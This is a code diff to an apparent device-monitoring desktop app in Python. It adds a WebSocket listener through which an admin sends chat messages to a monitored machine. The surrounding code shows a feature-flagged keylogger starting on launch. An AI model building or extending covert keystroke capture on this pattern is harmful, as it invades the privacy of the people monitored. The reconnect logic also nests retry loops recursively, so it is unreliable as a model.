@@ -346,6 +346,12 @@ class MonitoringApp:
             self._start_fast_action_loop()
         except Exception as _e:
             self.log(f"[Warning] fast_action_loop error: {_e}")
+
+        # Reverb WebSocket listener untuk chat real-time
+        try:
+            self._start_reverb_listener()
+        except Exception as _e:
+            self.log(f"[Warning] reverb_listener error: {_e}")
         
         if self.enabled_features.get("keylogger"):
             self.keylogger.start()
@@ -2322,6 +2328,114 @@ class MonitoringApp:
         win.lift()
         win.focus_force()
         self.log("[Chat] Popup chat support dibuka")
+
+
+
+    def _start_reverb_listener(self):
+        """
+        Connect ke Reverb WebSocket untuk terima pesan chat dari admin secara real-time.
+        Menggunakan Pusher protocol yang diimplementasikan Reverb.
+        Fallback ke HTTP polling (fast_action_loop) kalau WebSocket gagal.
+        """
+        import threading as _t
+        import json, hashlib, hmac
+
+        def _ws_loop():
+            try:
+                import websocket
+            except ImportError:
+                self.log("[Reverb] websocket-client belum install, pakai HTTP polling saja")
+                return
+
+            cfg = self.data_sender.fetch_reverb_config()
+            if not cfg:
+                self.log("[Reverb] Gagal ambil config, pakai HTTP polling saja")
+                return
+
+            host       = cfg.get("host", "127.0.0.1")
+            port       = cfg.get("port", 8080)
+            app_key    = cfg.get("app_key", "")
+            device_id  = cfg.get("device_id")
+            channel    = f"private-device.{device_id}"
+            ws_url     = f"ws://{host}:{port}/app/{app_key}?protocol=7&client=python&version=1.0"
+
+            socket_id_holder = [None]
+            subscribed        = [False]
+
+            def on_open(ws):
+                self.log("[Reverb] WebSocket connected")
+
+            def on_message(ws, raw):
+                try:
+                    data  = json.loads(raw)
+                    event = data.get("event", "")
+                    inner = data.get("data", {})
+                    if isinstance(inner, str):
+                        inner = json.loads(inner)
+
+                    if event == "pusher:connection_established":
+                        socket_id = inner.get("socket_id")
+                        socket_id_holder[0] = socket_id
+
+                        # Authenticate private channel
+                        auth = self.data_sender.get_channel_auth(socket_id, channel)
+                        if not auth:
+                            self.log("[Reverb] Channel auth gagal")
+                            return
+
+                        ws.send(json.dumps({
+                            "event": "pusher:subscribe",
+                            "data" : {"channel": channel, "auth": auth}
+                        }))
+
+                    elif event == "pusher_internal:subscription_succeeded":
+                        subscribed[0] = True
+                        self.log(f"[Reverb] Berhasil subscribe channel {channel}")
+
+                    elif event == "App\\Events\\ChatMessageSent" or ".chat.message" in event:
+                        msg = inner.get("message", "")
+                        if msg and msg != "__CHAT_ENDED__":
+                            self.root.after(0, lambda m=msg: self._show_chat_message(m))
+                            self.log(f"[Reverb] Pesan masuk: {msg[:30]}")
+                        elif msg == "__CHAT_ENDED__":
+                            self.root.after(0, self._close_chat_popup)
+                            self.data_sender.ack_chat_end()
+                            self.log("[Reverb] Chat diakhiri admin")
+
+                    elif event == "pusher:ping":
+                        ws.send(json.dumps({"event": "pusher:pong", "data": {}}))
+
+                except Exception as _e:
+                    self.log(f"[Reverb] Message error: {_e}")
+
+            def on_error(ws, err):
+                self.log(f"[Reverb] Error: {err}")
+
+            def on_close(ws, code, msg):
+                subscribed[0] = False
+                self.log(f"[Reverb] Disconnected (code={code}), reconnect 10 detik...")
+                import time
+                time.sleep(10)
+                # Reconnect
+                _ws_loop()
+
+            import time
+            while True:
+                try:
+                    ws_app = websocket.WebSocketApp(
+                        ws_url,
+                        on_open    = on_open,
+                        on_message = on_message,
+                        on_error   = on_error,
+                        on_close   = on_close,
+                    )
+                    ws_app.run_forever(ping_interval=30, ping_timeout=10)
+                except Exception as _e:
+                    self.log(f"[Reverb] Connect error: {_e}, retry 10 detik...")
+                    time.sleep(10)
+
+        _t.Thread(target=_ws_loop, daemon=True).start()
+        self.log("[Reverb] WebSocket listener started")
 
 
 def _ensure_single_instance():
